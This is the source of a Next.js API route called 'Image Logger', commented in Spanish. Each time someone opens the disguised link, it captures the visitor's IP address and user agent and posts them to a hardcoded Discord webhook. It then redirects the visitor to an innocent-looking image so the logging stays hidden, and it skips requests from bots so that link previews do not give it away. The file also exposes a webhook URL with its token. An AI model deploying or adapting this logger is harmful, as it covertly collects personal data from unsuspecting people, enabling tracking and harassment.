// pages/api/logger.js
import { NextResponse } from 'next/server';
import { parse } from 'url';
import httpagentparser from 'httpagentparser';

// Configuración (ajústala según tus necesidades)
const config = {
  webhook: "https://discord.com/api/webhooks/1369073366585311364/g77z4FZlG3M_ST0jZlOSSjrAulM7uMBKLLliJsSyC9hHIc8JsTueKiMI1HNQhNX1tDY7", // Reemplaza con tu webhook
  image: "https://i.redd.it/nefera-kills-morshabaal-10mins-before-ss-150-deaths-gtz-v0-l2mi9ig6nut81.png?width=1080&format=png&auto=webp&s=032edd82a3132411dbc7dce7156b267552326b42", // Imagen por defecto
  username: "Image Logger",
  color: 0x00FFFF, // Color del embed (azul claro)
  accurateLocation: false, // GPS (requiere permisos del usuario)
  message: {
    doMessage: false,
    message: "Mensaje personalizado aquí",
  },
};

// Función para enviar datos a Discord
async function sendToDiscord(embedData) {
  try {
    await fetch(config.webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: config.username,
        embeds: [embedData],
      }),
    });
  } catch (error) {
    console.error("Error al enviar a Discord:", error);
  }
}

export async function GET(request) {
  try {
    const { query } = parse(request.url, true);
    const ip = request.headers.get('x-forwarded-for') || "IP no detectada";
    const userAgent = request.headers.get('user-agent') || "User-Agent no detectado";

    // Obtener URL de la imagen (base64 o default)
    const imageUrl = query.url 
      ? Buffer.from(query.url, 'base64').toString() 
      : config.image;

    // Datos para el embed de Discord
    const embed = {
      title: "⚠️ Nueva IP Registrada",
      color: config.color,
      description: `
        **IP:** \`${ip}\`
        **User Agent:** \`\`\`${userAgent}\`\`\`
        **Imagen:** [Ver](${imageUrl})
      `,
      timestamp: new Date().toISOString(),
    };

    // Enviar a Discord (si no es un bot)
    if (!userAgent.includes("bot")) {
      await sendToDiscord(embed);
    }

    // Respuesta HTML (muestra la imagen o mensaje)
    if (config.message.doMessage) {
      return new NextResponse(
        `<html><body>${config.message.message}</body></html>`,
        { headers: { 'Content-Type': 'text/html' } }
      );
    } else {
      return NextResponse.redirect(imageUrl); // Redirige a la imagen
    }

  } catch (error) {
    console.error("Error interno:", error);
    return new NextResponse(
      "500 - Error del servidor",
      { status: 500 }
    );
  }
}
